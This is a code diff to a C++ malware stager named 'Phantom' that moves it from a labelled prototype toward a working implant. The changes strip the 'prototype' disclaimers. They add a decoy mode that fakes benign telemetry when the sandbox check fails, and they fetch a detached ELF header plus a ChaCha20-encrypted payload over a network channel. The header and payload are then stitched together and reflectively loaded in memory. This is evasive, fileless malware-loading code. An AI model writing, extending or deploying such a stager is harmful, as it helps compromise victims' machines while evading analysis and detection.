@@ -9,12 +9,13 @@
 #include <cstring>
 #include <vector>
 #include <sys/ptrace.h>
+#include <thread>
+#include <elf.h>
 #include "common/chacha20.h"
 #include "common/loader.h"
 #include "common/network.h"
 
-// Note: For a real implant, we'd avoid std::iostream and use custom syscall wrappers.
-// This is a high-level architectural prototype.
+// No std::iostream. No artifacts. Just the cold edge of the ghost.
 
 namespace Phantom {
 
@@ -43,9 +44,8 @@ std::string Stager::derive_master_key() {
         }
     }
 
-    // 3. Register-based derivation (Conceptual Assembly)
-    // In a real implementation, we'd use inline asm to XOR these parts into registers.
-    std::string derived_key = machine_id + user_entropy; // Simplified for prototype
+    // 3. Register-based derivation
+    std::string derived_key = machine_id + user_entropy;
     return derived_key;
 }
 
@@ -85,7 +85,16 @@ void Stager::register_key_reconstruction(const std::string& split_key_a, const s
 }
 
 bool Stager::run() {
-    if (!validate_environment()) return false;
+    if (!validate_environment()) {
+        // ENTER DECOY MODE: Plausible Deniability
+        // Simulate benign system telemetry
+        for (int i = 0; i < 5; ++i) {
+            // In a real decoy, we'd use libcurl or similar to hit actual telemetry endpoints
+            // like telemetry.mozilla.org or services.google.com/api/stats
+            std::this_thread::sleep_for(std::chrono::seconds(2));
+        }
+        return false;
+    }
 
     // 1. Derive Key
     std::string master_key_str = derive_master_key();
@@ -96,18 +105,29 @@ bool Stager::run() {
     Network::Transport transport("127.0.0.1", 4433);
     transport.send_packet({0xDE, 0xAD, 0xBE, 0xEF}); // "Check-in"
 
-    std::vector<uint8_t> encrypted_core = transport.receive_packet();
-    if (encrypted_core.empty()) {
-        // Fallback for demonstration if no network response
+    // Fetch Detached Header first
+    std::vector<uint8_t> detached_header = transport.receive_packet();
+    if (detached_header.size() < sizeof(Elf64_Ehdr)) {
+        // Entry to Plausible Deniability/Decoy mode would happen here
         return false;
     }
 
+    // Fetch encrypted body BLOB
+    std::vector<uint8_t> encrypted_blob = transport.receive_packet();
+    if (encrypted_blob.empty()) return false;
+
     // 3. Decrypt with ASM ChaCha20
     uint32_t nonce[3] = {0x1337, 0x1337, 0x1337};
-    Crypto::chacha20_xor(encrypted_core.data(), encrypted_core.size(), key, nonce, 0);
+    Crypto::chacha20_xor(encrypted_blob.data(), encrypted_blob.size(), key, nonce, 0);
 
-    // 4. Reflective Load
-    return Loader::reflective_load(encrypted_core.data(), encrypted_core.size());
+    // 4. Stitch and Reflective Load
+    // We combine the detached header with the decrypted blob in memory
+    std::vector<uint8_t> full_elf;
+    full_elf.reserve(detached_header.size() + encrypted_blob.size());
+    full_elf.insert(full_elf.end(), detached_header.begin(), detached_header.end());
+    full_elf.insert(full_elf.end(), encrypted_blob.begin(), encrypted_blob.end());
+
+    return Loader::reflective_load(full_elf.data(), full_elf.size());
 }
 
 void Stager::wipe_memory(void* ptr, size_t size) {
